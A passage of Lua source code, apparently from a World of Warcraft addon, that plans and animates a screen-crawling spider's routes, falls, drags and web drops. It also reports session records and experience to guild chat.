    S.nspRouteHistory = {}
    S.nspRouteContext = nil
    S.nspRouteLoopHandled = nil
end

function NSPauk:NP_GetRouteContext()
    local S = self.S

    local instId = "0"
    if S.currentInstance and S.currentInstance.id then
        instId = tostring(S.currentInstance.id)
    end

    return string.format(
        "%s:%s:%s",
        tostring(S.phase),
        instId,
        (S.moth and S.moth.active) and "moth" or "nomoth"
    )
end

function NSPauk:NP_MakeRouteSignature(from, to, route)
    local parts = {}

    local function pt(p)
        if type(p) ~= "table" or type(p.x) ~= "number" or type(p.y) ~= "number" then
            return "nil"
        end
        return string.format("%.0f,%.0f", p.x, p.y)
    end

    if type(route) == "table" and type(route.points) == "table" and #route.points > 0 then
        parts[#parts + 1] = "K:" .. tostring(route.kind or "?")
        parts[#parts + 1] = "N:" .. tostring(#route.points)
        parts[#parts + 1] = "T:" .. pt(to)

        local maxPts = 24
        local n = #route.points
        local step = 1

        if n > maxPts then
            step = math.floor(n / maxPts)
            if step < 1 then
                step = 1
            end
        end

        for i = 1, n, step do
            parts[#parts + 1] = pt(route.points[i])
        end

        parts[#parts + 1] = pt(route.points[n])
    else
        parts[#parts + 1] = "K:none"
        parts[#parts + 1] = "F:" .. pt(from)
        parts[#parts + 1] = "T:" .. pt(to)
    end

    return table.concat(parts, "|")
end

function NSPauk:NP_RecordRoute(from, to, route)
    local S = self.S
    local ctx = self:NP_GetRouteContext()

    if S.nspRouteContext ~= ctx then
        S.nspRouteHistory = {}
        S.nspRouteContext = ctx
        S.nspRouteLoopHandled = nil
    end

    if type(S.nspRouteHistory) ~= "table" then
        S.nspRouteHistory = {}
    end

    local sig = self:NP_MakeRouteSignature(from, to, route)
    local hist = S.nspRouteHistory

    hist[#hist + 1] = sig

    while #hist > 3 do
        table.remove(hist, 1)
    end

    if #hist == 3 and hist[1] == hist[2] and hist[2] == hist[3] then
        return true, sig
    end

    return false, sig
end

function NSPauk:NP_HandleRouteLoop(task, from, to, dragMode)
    local S = self.S

    self:NP_ResetRouteHistory()

    if not task then
        return 0
    end

    if dragMode or S.nspDrag then
        self:NP_ClearGlobalDrag(true)
    end

    if task.nspDragTextures then
        self:RecycleTextures(task.nspDragTextures)
        task.nspDragTextures = nil
    end

    local sw, sh = self:GetScreenSize()
    local gap = self:NP_GetGap()

    local function cp(p)
        if not p then
            return { x = 0, y = 0 }
        end
        return { x = p.x or 0, y = p.y or 0 }
    end

    if type(from) ~= "table" then
        from = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }
    end

    local target = to

    if not target and task.p2 then
        target = cp(task.p2)
    end

    if not target then
        target = cp(from)
    end

    local pos = S.taskIdx
    if type(pos) ~= "number" or pos < 1 or pos > #S.tasks + 1 then
        pos = #S.tasks + 1
    end

    local bottomY = gap * 0.25
    if bottomY < 1 then
        bottomY = 1
    end

    local insertIdx = pos

    local dropTask = self:NP_MakeFallTask(from, {
        x = from.x,
        y = bottomY,
    })

    if dragMode then
        dropTask.nspDuringDrag = true
    end

    table.insert(S.tasks, insertIdx, dropTask)
    insertIdx = insertIdx + 1

    if math.abs(target.x - from.x) > 2 then
        local crawlTask = self:NP_MakeCrawlTask(
            { x = from.x, y = bottomY },
            { x = target.x, y = bottomY },
            task
        )

        crawlTask.nspNoSupportCheck = true
        crawlTask.nspSupportA = { kind = "edge", edgeSide = "bottom" }
        crawlTask.nspSupportB = { kind = "edge", edgeSide = "bottom" }

        if dragMode then
            crawlTask.nspDuringDrag = true
        end

        table.insert(S.tasks, insertIdx, crawlTask)
        insertIdx = insertIdx + 1
    end

    local climbTo = cp(target)

    local climbSupported = self:NP_NearSupportWithin(
        climbTo.x,
        climbTo.y,
        gap * 1.5
    )

    if not climbSupported then
        local land = self:NP_FindFallTarget(climbTo.x, climbTo.y)

        if land
            and type(land.x) == "number"
            and land.x == land.x
            and type(land.y) == "number"
            and land.y == land.y then
            climbTo = { x = land.x, y = land.y }

            climbSupported = self:NP_NearSupportWithin(
                climbTo.x,
                climbTo.y,
                gap * 1.5
            )
        end
    end

    -- Если так и не нашли опору, не лезем вверх.
    -- Остаёмся на нижнем крае экрана.
    if not climbSupported then
        climbTo = {
            x = climbTo.x,
            y = bottomY,
        }
    end

    local climbTask = self:NP_MakeCrawlTask(
        { x = climbTo.x, y = bottomY },
        climbTo,
        task
    )

    climbTask.nspNoSupportCheck = false
    climbTask.nspAllowTeleport = true
    climbTask.nspLoopBreaker = true

    if dragMode then
        climbTask.nspDuringDrag = true
    end

    if task.nspDragEnd then
        climbTask.nspDragEnd = true
    end

    table.insert(S.tasks, insertIdx, climbTask)
    insertIdx = insertIdx + 1

    S.taskIdx = pos
    S.currentTask = nil
    S.phase = "task"

    return 0
end

function NSPauk:NP_LocalAngleAtHub(inst, conn)
    if not inst or not conn or not conn.thread then
        return 0
    end

    local hubX = (inst.hub.rect and inst.hub.rect.cx) or 0
    local hubY = (inst.hub.rect and inst.hub.rect.cy) or 0

    if not conn.arcLength or conn.arcLength <= 0 then
        local samples, total = self:BuildArcSamples(conn.thread)
        conn.arcSamples = samples
        conn.arcLength = total
    end

    local total = conn.arcLength or 0
    local angle = nil

    if total > 1 then
        local dist = 100

        if dist > total * 0.5 then
            dist = total * 0.5
        end

        local t = self:ThreadTAtLength(conn, dist)

        if t then
            local x, y = self:BzThread(conn.thread, t)
            local dx = x - hubX
            local dy = y - hubY

            if dx * dx + dy * dy > 0.01 then
                angle = math.atan2(dy, dx)
            end
        end
    end

    if not angle then
        angle = conn.thread.angle or 0
    end

    local twoPi = math.pi * 2

    while angle < 0 do
        angle = angle + twoPi
    end

    while angle >= twoPi do
        angle = angle - twoPi
    end

    return angle
end

function NSPauk:NP_ExecutePlan(task)
    local S = self.S
    if not task then
        return 0
    end

    local from = {
        x = S.lastSpiderX or 0,
        y = S.lastSpiderY or 0,
    }
    local gap = self:NP_GetGap()
    local startInsertIndex = S.taskIdx
    local insertIndex = S.taskIdx
    local inserted = 0
    local loopHit = false

    local function insert(t)
        if t then
            table.insert(S.tasks, insertIndex, t)
            insertIndex = insertIndex + 1
            inserted = inserted + 1
        end
    end

    local function cleanupInserted()
        if inserted > 0 then
            for _ = 1, inserted do
                table.remove(S.tasks, startInsertIndex)
            end
            insertIndex = startInsertIndex
            inserted = 0
        end
    end

    local planTarget
    if task.nspContinueDrag then
        planTarget = task.p2
    elseif task.nspDrag and task.finalThread then
        planTarget = task.finalThread.p2
    else
        planTarget = task.p2
    end

    if planTarget and planTarget.x and planTarget.y then
        local targetSupported = self:NP_FreshHasSupportAt(planTarget.x, planTarget.y)
            or self:NP_NearSupportWithin(planTarget.x, planTarget.y, gap * 1.25)

        if not targetSupported then
            local depth = math.max(
                tonumber(task.nspFallDepth) or 0,
                tonumber(task.nspAttempts) or 0
            )

            if task.nspDrag and not task.nspContinueDrag then
                if S.nspDrag then
                    self:NP_ClearGlobalDrag(true)
                end
                return 0
            end

            if task.nspContinueDrag and task.nspDragEnd then
                self:NP_ClearGlobalDrag(true)
                return 0
            end

            if depth >= 3 then
                if task.nspContinueDrag then
                    self:NP_ClearGlobalDrag(true)
                end
                return 0
            end

            local land = self:NP_FindFallTarget(planTarget.x, planTarget.y)
            if land and land.x and land.y then
                task.p2 = {
                    x = land.x,
                    y = land.y,
                }
                task.nspAdjustedTarget = true
                planTarget = task.p2
            end
        end
    end

    local function insertRoute(fromPoint, toPoint, dragMode, plan)
        local route = self:NP_BuildRoute(fromPoint, toPoint)
        local pendingDrop = nil
        local routeFrom = fromPoint

        if (not route or not route.points or #route.points < 2)
            and (fromPoint.y or 0) > 2 then
            pendingDrop = self:NP_MakeTempDropTask(fromPoint, {
                x = fromPoint.x,
                y = 0,
            })
            if dragMode then
                pendingDrop.nspDuringDrag = true
            end
            routeFrom = {
                x = fromPoint.x,
                y = 0,
            }
            route = self:NP_BuildRoute(routeFrom, toPoint)
        end

        local looped = self:NP_RecordRoute(routeFrom, toPoint, route)
        if looped then
            loopHit = true
            return 0
        end

        local made = 0

        if pendingDrop then
            insert(pendingDrop)
            made = made + 1
            fromPoint = routeFrom
        end

        if route and route.points and #route.points >= 2 then
            for i = 1, #route.points - 1 do
                local ct = self:NP_MakeCrawlTask(
                    route.points[i],
                    route.points[i + 1],
                    plan
                )
                if dragMode then
                    ct.nspDuringDrag = true
                end
                insert(ct)
                made = made + 1
            end

            if route.dropToTarget then
                local dropFrom = route.dropFrom or {
                    x = toPoint.x,
                    y = S.SH or 0,
                }
                local dropDist = math.abs((dropFrom.y or 0) - toPoint.y)
                if dropDist > 2 then
                    local drop = self:NP_MakeTempDropTask(dropFrom, toPoint)
                    if dragMode then
                        drop.nspDuringDrag = true
                    end
                    insert(drop)
                    made = made + 1
                else
                    local ct = self:NP_MakeCrawlTask(dropFrom, toPoint, plan)
                    if dragMode then
                        ct.nspDuringDrag = true
                    end
                    insert(ct)
                    made = made + 1
                end
            end
        else
            return 0
        end

        return made
    end

    if task.nspContinueDrag then
        local depth = tonumber(task.nspFallDepth) or 0
        local fromSupported = self:NP_FreshHasSupportAt(from.x, from.y)
            or self:NP_NearSupportWithin(from.x, from.y, gap * 1.5)

        if not fromSupported and depth < 3 then
            local fall = self:NP_MakeFallTask(
                from,
                self:NP_FindFallTarget(from.x, from.y)
            )
            if S.nspDrag then
                fall.nspDuringDrag = true
            end
            insert(fall)
            local copy = self:NP_CopyPlanTask(task)
            copy.nspFallDepth = depth + 1
            insert(copy)
            return inserted
        end

        local target = task.p2 and {
            x = task.p2.x,
            y = task.p2.y,
        } or {
            x = from.x,
            y = from.y,
        }

        local dragMode = S.nspDrag ~= nil

        local route = self:NP_BuildRoute(from, target)
        local looped = self:NP_RecordRoute(from, target, route)
        if looped then
            cleanupInserted()
            return self:NP_HandleRouteLoop(task, from, target, dragMode)
        end

        if route and route.points and #route.points >= 2 then
            for i = 1, #route.points - 1 do
                local ct = self:NP_MakeCrawlTask(
                    route.points[i],
                    route.points[i + 1],
                    task
                )
                if dragMode then
                    ct.nspDuringDrag = true
                end
                insert(ct)
            end

            if route.dropToTarget then
                local dropFrom = route.dropFrom or {
                    x = target.x,
                    y = S.SH or 0,
                }
                local dropDist = math.abs((dropFrom.y or 0) - target.y)
                if dropDist > 2 then
                    local drop = self:NP_MakeTempDropTask(dropFrom, target)
                    if dragMode then
                        drop.nspDuringDrag = true
                    end
                    insert(drop)
                else
                    local ct = self:NP_MakeCrawlTask(dropFrom, target, task)
                    if dragMode then
                        ct.nspDuringDrag = true
                    end
                    insert(ct)
                end
            end
        else
            local direct = self:NP_MakeCrawlTask(from, target, task)
            direct.nspNoSupportCheck = true
            if dragMode then
                direct.nspDuringDrag = true
            end
            insert(direct)
        end

        if dragMode and inserted > 0 and task.nspDragEnd then
            local last = S.tasks[insertIndex - 1]
            if last then
                last.nspDragEnd = true
                last.nspDuringDrag = true
            end
        end

        return inserted
    end

    local depth = tonumber(task.nspFallDepth) or 0
    local fromSupported = self:NP_FreshHasSupportAt(from.x, from.y)
        or self:NP_NearSupportWithin(from.x, from.y, gap * 1.5)

    if task.nspPlan and not task.nspAllowNoSupport and not fromSupported then
        if depth < 3 then
            local fall = self:NP_MakeFallTask(
                from,
                self:NP_FindFallTarget(from.x, from.y)
            )
            insert(fall)
            local copy = self:NP_CopyPlanTask(task)
            copy.nspFallDepth = depth + 1
            copy.nspAllowNoSupport = nil
            insert(copy)
            return inserted
        else
            task.nspAllowNoSupport = true
        end
    end

    S.nspSupportCache = nil

    if task.nspDrag then
        self:NP_ClearGlobalDrag(false)

        local anchor = (task.finalThread and task.finalThread.p0) or task.p0
        local target = (task.finalThread and task.finalThread.p2) or task.p2
        anchor = {
            x = anchor.x or 0,
            y = anchor.y or 0,
        }
        target = {
            x = target.x or 0,
            y = target.y or 0,
        }

        local dx = from.x - anchor.x
        local dy = from.y - anchor.y
        local anchorDist2 = dx * dx + dy * dy

        if anchorDist2 > 9 then
            insertRoute(from, anchor, false, task)
            if loopHit then
                cleanupInserted()
                return self:NP_HandleRouteLoop(task, from, anchor, false)
            end
        end

        insert(self:NP_MakeStartDragTask(task, anchor))

        insertRoute(anchor, target, true, task)
        if loopHit then
            cleanupInserted()
            return self:NP_HandleRouteLoop(task, anchor, target, true)
        end

        if inserted > 0 then
            local last = S.tasks[insertIndex - 1]
            if last then
                last.nspDragEnd = true
                last.nspDuringDrag = true
            end
        end

        return inserted
    end

    local to = task.p2 and {
        x = task.p2.x,
        y = task.p2.y,
    } or {
        x = from.x,
        y = from.y,
    }

    insertRoute(from, to, false, task)
    if loopHit then
        cleanupInserted()
        return self:NP_HandleRouteLoop(task, from, to, false)
    end

    return inserted
end

function NSPauk:NP_GetAntiTeleportTolerance()
    return 4
end

function NSPauk:NP_GetSpiderPointIfShown()
    local S = self.S

    if S.spider and S.spider:IsShown() then
        return {
            x = S.lastSpiderX or 0,
            y = S.lastSpiderY or 0,
        }
    end

    return nil
end

function NSPauk:NP_TaskAllowsImmediateStart(task)
    if not task then
        return false
    end

    -- Если мы явно разрешили мгновенный старт после нескольких попыток подхода.
    if task.nspAllowTeleport then
        return true
    end

    -- Восстановление состояния после мотылька может мгновенно поставить паука.
    if task.nspMothRestore then
        return true
    end

    return false
end

function NSPauk:NP_TaskNeedsFixedStart(task)
  if not task then
    return false
  end

  if task.nspStartDragTask then
    return true
  end

  if task.nspMothFreeze then
    return true
  end

  if task.kind == "thread" then
    return true
  end

  return false
end

function NSPauk:NP_RecalcTaskStartFromCurrent(task)
    local cur = self:NP_GetSpiderPointIfShown()

    if not cur or not task then
        return
    end

    if not task.p0
        or type(task.p0.x) ~= "number"
        or type(task.p0.y) ~= "number" then
        return
    end

    local dx = task.p0.x - cur.x
    local dy = task.p0.y - cur.y

    if dx * dx + dy * dy <= 1 then
        return
    end

    task.p0 = {
        x = cur.x,
        y = cur.y,
    }

    if task.p2
        and type(task.p2.x) == "number"
        and type(task.p2.y) == "number" then
        task.p1 = {
            x = (cur.x + task.p2.x) / 2,
            y = (cur.y + task.p2.y) / 2,
        }
    else
        task.p1 = {
            x = cur.x,
            y = cur.y,
        }
    end

    -- Если это drag-задача, у которой запомнена финальная нить,
    -- тоже подтягиваем её начало к текущей точке, чтобы не было разрыва.
    if task.finalThread
        and task.finalThread.p2
        and type(task.finalThread.p2.x) == "number"
        and type(task.finalThread.p2.y) == "number" then
        task.finalThread.p0 = {
            x = cur.x,
            y = cur.y,
        }

        task.finalThread.p1 = {
            x = (cur.x + task.finalThread.p2.x) / 2,
            y = (cur.y + task.finalThread.p2.y) / 2,
        }
    end

    task.pathLength = nil
    task.dropRemainder = nil
    task.nspRecalculatedFromCurrent = true
end

function NSPauk:NP_InsertApproachBeforeTask(task)
    local S = self.S

    local cur = self:NP_GetSpiderPointIfShown()
    if not cur or not task or not task.p0 then
        return false
    end

    if type(task.p0.x) ~= "number" or type(task.p0.y) ~= "number" then
        return false
    end

    local inst
    if task.owner then
        inst = self:GetOwnerInstance(task.owner)
    end
    if not inst and task.conn then
        inst = self:GetOwnerInstance(task.conn)
    end

    if task.nspCocoon then
        local useCommonRoute = task.nspCocoonEntry
            and inst
            and inst.isCocoon
            and not inst.isMoth

        if useCommonRoute then
            local plan = self:NP_MakePlanTask(
                "travel",
                {
                    x = cur.x,
                    y = cur.y,
                },
                {
                    x = task.p0.x,
                    y = task.p0.y,
                },
                task.conn,
                task.owner
            )

            plan.nspCocoonEntryPlan = true
            plan.nspApproachPlan = true

            table.insert(S.tasks, S.taskIdx, plan)

            task.nspApproachInserted = (task.nspApproachInserted or 0) + 1

            return true
        end

        local dx = task.p0.x - cur.x
        local dy = task.p0.y - cur.y

        if dx * dx + dy * dy <= 1 then
            return false
        end

        local approach = {
            kind = "travel",
            nspCocoon = true,
            nspCocoonApproach = true,
            nspNoSupportCheck = true,
            nspNoInsert = true,
            nspAllowTeleport = true,
            drop = false,
            p0 = {
                x = cur.x,
                y = cur.y,
            },
            p1 = {
                x = (cur.x + task.p0.x) / 2,
                y = (cur.y + task.p0.y) / 2,
            },
            p2 = {
                x = task.p0.x,
                y = task.p0.y,
            },
            conn = task.conn,
            owner = task.owner,
        }

        table.insert(S.tasks, S.taskIdx, approach)

        task.nspApproachInserted = (task.nspApproachInserted or 0) + 1

        return true
    end

    local plan = self:NP_MakePlanTask(
        "travel",
        {
            x = cur.x,
            y = cur.y,
        },
        {
            x = task.p0.x,
            y = task.p0.y,
        },
        task.conn,
        task.owner
    )

    plan.nspApproachPlan = true

    table.insert(S.tasks, S.taskIdx, plan)

    task.nspApproachInserted = (task.nspApproachInserted or 0) + 1

    return true
end

function NSPauk:NP_FlushSessionBurst()
    local S = self.S

    if type(S) ~= "table" then
        return
    end

    if not self.initialized or S.runtimeOff or S.phase == "off" then
        return
    end

    if S.combatHide then
        return
    end

    local count = math.floor((tonumber(S.sessionBurstPoints) or 0) + 0.5)

    S.sessionBurstPoints = 0

    if count <= 0 then
        return
    end

    if type(S.session) ~= "table" then
        self:ResetSessionRecord()
    end

    local session = S.session

    local oldBest = math.floor((tonumber(session.bestPoints) or 0) + 0.5)

    if count <= oldBest then
        return
    end

    local expGain = self:CalcWebExperience(count)

    if type(expGain) ~= "number"
        or expGain ~= expGain
        or expGain <= 0 then
        expGain = 1
    end

    expGain = math.floor(expGain + 0.5)

    if expGain <= 0 then
        expGain = 1
    end

    session.bestPoints = count
    session.bestExpAwarded = math.floor(
        (tonumber(session.bestExpAwarded) or 0) + expGain + 0.5
    )

    local level
    local left

    local _, newLevel, newLeft = self:AddExperience(expGain)

    level = newLevel
    left = newLeft

    if type(level) ~= "number" or level ~= level or level <= 0 then
        level = self:GetSpiderLevel()
    end

    if type(left) ~= "number" or left ~= left then
        local db = self:EnsureDB()

        local perLevel = tonumber(self.C.POINTS_PER_LEVEL) or 60000

        if perLevel <= 0 then
            perLevel = 60000
        end

        local total = db.progress.totalPoints or 0

        left = perLevel - (total % perLevel)

        if left == perLevel then
            left = 0
        end
    end

    local C = self.C or {}

    local perLevel = tonumber(C.POINTS_PER_LEVEL) or 60000

    if perLevel <= 0 then
        perLevel = 60000
    end

    local full = C.SESSION_FULL_POINTS

    if type(full) ~= "number" or full ~= full or full <= 0 then
        full = perLevel
    end

    local levelPct = 0

    if perLevel > 0 then
        levelPct = expGain / perLevel * 100
    end

    local countPct = 0

    if full > 0 then
        countPct = count / full * 100
    end

    self:SendOfficer(string.format(
        "Рекорд сессии: %d (%.1f%% от %d), прошлый %d. Опыт +%d (%.2f%% уровня). Уровень %d, до уровня %d",
        count,
        countPct,
        full,
        oldBest,
        expGain,
        levelPct,
        level,
        left
    ))

    if SendAddonMessage then
        SendAddonMessage("nsCountP", count, "GUILD")
    end
end

function NSPauk:AdvanceTask()
  local S = self.S
  local old = S.currentTask
  local gap = self:NP_GetGap()

  local function makeContinueTask(task, fromPoint)
    local to = task.p2 and {
      x = task.p2.x,
      y = task.p2.y,
    } or {
      x = fromPoint.x,
      y = fromPoint.y,
    }

    local cont = self:NP_MakePlanTask("travel", fromPoint, to, task.conn, task.owner)
    cont.nspFallDepth = task.nspFallDepth or 0

    if task.nspDuringDrag and S.nspDrag then
      cont.nspDrag = true
      cont.nspContinueDrag = true
      cont.finalThread = S.nspDrag.finalThread
      cont.owner = S.nspDrag.owner or task.owner
      cont.nspDragEnd = task.nspDragEnd
    end

    return cont
  end

  if old
    and old.nspCrawl
    and not old.nspNoSupportCheck
    and not old.nspSupportLostHandled then
    local ownerAlive = not (old.owner and not old.owner.alive)
    local dragOwnerAlive = not (
      old.nspDuringDrag
      and S.nspDrag
      and S.nspDrag.owner
      and not S.nspDrag.owner.alive
    )

    if ownerAlive
      and dragOwnerAlive
      and not self:NP_ValidateTaskCurrentSupport(
        old,
        S.lastSpiderX or 0,
        S.lastSpiderY or 0
      ) then
      if self:NP_NearSupportWithin(
        S.lastSpiderX or 0,
        S.lastSpiderY or 0,
        gap * 1.5
      ) then
        old.nspSupportLostHandled = true
      else
        old.nspSupportLostHandled = true

        local from = {
          x = S.lastSpiderX or 0,
          y = S.lastSpiderY or 0,
        }
        local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))

        if old.nspDuringDrag then
          fall.nspDuringDrag = true
        end

        table.insert(S.tasks, S.taskIdx, fall)

        local cont = makeContinueTask(old, {
          x = fall.p2.x,
          y = fall.p2.y,
        })

        table.insert(S.tasks, S.taskIdx + 1, cont)
      end
    end
  end

  if old and old.nspDuringDrag and not old.nspSupportLostHandled then
    if old.nspDragEnd then
      if S.moveT and S.moveT >= 1 and self:IsTaskValid(old) then
        self:NP_FinishGlobalDrag(old)
      else
        self:NP_ClearGlobalDrag(true)
      end
    else
      if not self:IsTaskValid(old) then
        self:NP_ClearGlobalDrag(true)
      end
    end
  end

  if old and old.nspPlan then
    S.currentTask = nil
  end

  if S.limitReturnPending or S.phase == "limitWait" then
    if S.limitReturnPending then
      S.limitReturnPending = false
      S.phase = "limitWait"
      S.limitWaitTimer = 0
      S.completeTimer = 0
    end

    return
  end

  while S.taskIdx <= #S.tasks do
    local task = S.tasks[S.taskIdx]

    if self:IsTaskValid(task) then
      local x = S.lastSpiderX or 0
      local y = S.lastSpiderY or 0
      local supported = true
      local needPreFallCheck = S.spider
        and S.spider:IsShown()
        and not task.nspPlan
        and not task.nspFall
        and not task.nspNoSupportCheck
        and not task.nspPreFallInserted

      if needPreFallCheck then
        supported = self:NP_ValidateTaskCurrentSupport(task, x, y)
      end

      if needPreFallCheck and not supported then
        if self:NP_NearSupportWithin(x, y, gap * 1.5) then
          supported = true
        end
      end

      if needPreFallCheck and not supported then
        task.nspPreFallInserted = true

        local from = {
          x = x,
          y = y,
        }
        local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))

        table.insert(S.tasks, S.taskIdx, fall)
      elseif task.nspPlan then
        S.taskIdx = S.taskIdx + 1
        self:NP_ExecutePlan(task)

        if S.limitReturnPending or S.phase == "limitWait" then
          return
        end
      else
        local skipStart = false

        if not self:NP_TaskAllowsImmediateStart(task) then
          local cur = self:NP_GetSpiderPointIfShown()

          if cur
            and task.p0
            and type(task.p0.x) == "number"
            and type(task.p0.y) == "number" then
            local tol = self:NP_GetAntiTeleportTolerance()
            local dx = task.p0.x - cur.x
            local dy = task.p0.y - cur.y

            if dx * dx + dy * dy > tol * tol then
              if self:NP_TaskNeedsFixedStart(task) then
                if (task.nspApproachInserted or 0) < 3 then
                  if self:NP_InsertApproachBeforeTask(task) then
                    skipStart = true
                  else
                    self:NP_RecalcTaskStartFromCurrent(task)
                  end
                else
                  self:NP_RecalcTaskStartFromCurrent(task)
                  task.nspApproachFailed = true
                end
              else
                self:NP_RecalcTaskStartFromCurrent(task)
              end
            end
          end
        end

        if skipStart then
          S.currentTask = nil
        else
          S.currentTask = task
          S.taskIdx = S.taskIdx + 1
          self:StartTask(task)
          return
        end
      end
    else
      local ownerAlive = not (task.owner and not task.owner.alive)
      local dragOwnerAlive = not (
        task.nspDuringDrag
        and S.nspDrag
        and S.nspDrag.owner
        and not S.nspDrag.owner.alive
      )

      if task
        and task.nspCrawl
        and not task.nspNoSupportCheck
        and not task.nspSupportLostConsumed
        and ownerAlive
        and dragOwnerAlive
        and not self:NP_ValidateTaskCurrentSupport(
          task,
          S.lastSpiderX or 0,
          S.lastSpiderY or 0
        ) then
        if self:NP_NearSupportWithin(
          S.lastSpiderX or 0,
          S.lastSpiderY or 0,
          gap * 1.5
        ) then
          task.nspSupportLostConsumed = true
          S.taskIdx = S.taskIdx + 1
        else
          task.nspSupportLostConsumed = true

          local from = {
            x = S.lastSpiderX or 0,
            y = S.lastSpiderY or 0,
          }
          local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))

          if task.nspDuringDrag then
            fall.nspDuringDrag = true
          end

          table.insert(S.tasks, S.taskIdx, fall)

          local cont = makeContinueTask(task, {
            x = fall.p2.x,
            y = fall.p2.y,
          })

          table.insert(S.tasks, S.taskIdx + 1, cont)
        end
      else
        if task
          and task.nspDuringDrag
          and not task.nspSupportLostConsumed then
          self:NP_ClearGlobalDrag(true)
        end

        S.taskIdx = S.taskIdx + 1
      end
    end
  end

  if S.limitReturnPending then
    S.limitReturnPending = false
    S.phase = "limitWait"
    S.limitWaitTimer = 0
    S.completeTimer = 0
    return
  end

  S.phase = "instanceComplete"
  S.completeTimer = 0
end

function NSPauk:StartTask(task)
  local S = self.S
  local C = self.C

  if task.nspPlan then
    S.currentTask = nil
    self:NP_ExecutePlan(task)
    S.phase = "task"
    S.moveDur = 0.05
    S.moveT = 0
    return
  end

  if task.nspMothRestore then
    self:PutSpider(task.p0.x, task.p0.y)
    self:RestoreMothStateImmediate(task.nspSaved)
    return
  end

  if task.nspMothPounce then
    local cur = self:NP_GetSpiderPointIfShown()

    if cur and task.p2 and type(task.p2.x) == "number" and type(task.p2.y) == "number" then
      task.p0 = {
        x = cur.x,
        y = cur.y,
      }
      task.p1 = {
        x = (cur.x + task.p2.x) / 2,
        y = (cur.y + task.p2.y) / 2,
      }
    end

    task.pathLength = nil
    task.drop = false

    local pounceLen = self:ApproxThreadLength(task)

    if pounceLen < 1 then
      pounceLen = 1
    end

    local pounceSpeed = self:RandomInt(1600, 2200)

    S.currentTask = task
    S.moveDur = pounceLen / pounceSpeed

    if S.moveDur < 0.08 then
      S.moveDur = 0.08
    end

    if S.moveDur > 0.28 then
      S.moveDur = 0.28
    end

    S.moveT = 0
    S.lastTaskT = 0
    S.speedTimer = 0
    S.phase = "task"
    self:PutSpider(task.p0.x, task.p0.y)
    return
  end

  if task.nspMothFreeze then
    if not self:NP_TaskAllowsImmediateStart(task) then
      self:NP_RecalcTaskStartFromCurrent(task)
    end

    if self.GetMothStuckInfo and not self:GetMothStuckInfo() then
      self:AbortMothHunt(false, false, true)
      return
    end

    if self.CallMoth then
      self:CallMoth("Freeze")
    end

    if S.moth and S.moth.active then
      S.moth.frozen = true
      S.moth.phase = "wrap"
    end

    S.currentTask = task
    task.drop = false
    S.moveDur = 0.2
    S.moveT = 0
    S.lastTaskT = 0
    S.speedTimer = 0
    S.phase = "task"
    self:PutSpider(task.p0.x, task.p0.y)
    return
  end

  S.currentTask = task

  if task.kind ~= "thread" then
    task.drop = false
  end

  local cur = self:NP_GetSpiderPointIfShown()

  if cur
    and not self:NP_TaskAllowsImmediateStart(task)
    and task.p0
    and type(task.p0.x) == "number"
    and type(task.p0.y) == "number" then
    local tol = self:NP_GetAntiTeleportTolerance()
    local dx = task.p0.x - cur.x
    local dy = task.p0.y - cur.y

    if dx * dx + dy * dy > tol * tol then
      self:NP_RecalcTaskStartFromCurrent(task)
    end
  end

  if task.nspFall then
    if cur and task.p2 and type(task.p2.y) == "number" then
      task.p0 = {
        x = cur.x,
        y = cur.y,
      }

      if task.p2.y > task.p0.y - 1 then
        task.p2 = {
          x = task.p0.x,
          y = math.max(0, task.p0.y - 1),
        }
      else
        task.p2 = {
          x = task.p0.x,
          y = task.p2.y,
        }
      end

      task.p1 = {
        x = task.p0.x,
        y = (task.p0.y + task.p2.y) / 2,
      }
    end

    task.pathLength = nil
  end

  if task.nspCrawl then
    if cur
      and task.p2
      and type(task.p2.x) == "number"
      and type(task.p2.y) == "number" then
      local dx = task.p0.x - cur.x
      local dy = task.p0.y - cur.y

      if dx * dx + dy * dy > 1 then
        task.p0 = {
          x = cur.x,
          y = cur.y,
        }
        task.p1 = {
          x = (cur.x + task.p2.x) / 2,
          y = (cur.y + task.p2.y) / 2,
        }
        task.pathLength = nil
      end
    end
  end

  local pathLen = self:ApproxThreadLength(task)
  task.pathLength = pathLen

  local len = pathLen

  if len < 1 then
    len = 1
  end

  local speed = self:RandomInt(C.SPIDER_SPEED_MIN, C.SPIDER_SPEED_MAX)

  if task.kind == "travel" then
    speed = speed * C.TRAVEL_SPEED_MULT
  end

  if task.isCross then
    speed = speed * C.CROSS_SPEED_MULT
  end

  if task.isMain then
    speed = speed * C.MAIN_SPEED_MULT
  end

  if type(C.FAST_MODE) == "number" and C.FAST_MODE > 0 then
    speed = speed * C.FAST_MODE
  end

  if self:IsEmptyMovementTask(task) then
    speed = speed * (C.EMPTY_SPEED_MULT or 4)
  end

  if speed <= 0 then
    speed = 1
  end

  S.moveDur = len / speed

  if S.moveDur < 0.05 then
    S.moveDur = 0.05
  end

  S.moveT = 0
  S.lastTaskT = 0
  S.speedTimer = 0
  S.phase = "task"
  S.lastDropX = task.p0.x
  S.lastDropY = task.p0.y
  self:PutSpider(task.p0.x, task.p0.y)

  if task.drop then
    task.dropSpacing = self:GetWebPointSpacingForTask(task)
    task.dropRemainder = 0
    self:DropWebForTask(task, task.p0.x, task.p0.y)
  else
    task.dropSpacing = nil
    task.dropRemainder = nil
  end

  if task.nspStartDragTask then
    self:NP_StartDrag(task)
  end

  if task.nspFall then
    local fallLen = self:ApproxThreadLength(task)
    task.pathLength = fallLen

    if fallLen < 1 then
      fallLen = 1
    end

    local fallMult = math.max(3, (tonumber(C.TRAVEL_SPEED_MULT) or 6) * 0.8) * 4
    local fallSpeed = self:RandomInt(C.SPIDER_SPEED_MIN, C.SPIDER_SPEED_MAX) * fallMult

    if type(C.FAST_MODE) == "number" and C.FAST_MODE > 0 then
      fallSpeed = fallSpeed * C.FAST_MODE
    end

    if fallSpeed <= 0 then
      fallSpeed = 1
    end

    S.moveDur = fallLen / fallSpeed

    if S.moveDur < 0.05 then
      S.moveDur = 0.05
    end

    S.moveT = 0
    S.lastTaskT = 0
    self:PutSpider(task.p0.x, task.p0.y)
  end

  if task.nspCrawl then
    local crawlLen = self:ApproxThreadLength(task)
    task.pathLength = crawlLen

    if crawlLen < 1 then
      crawlLen = 1
    end

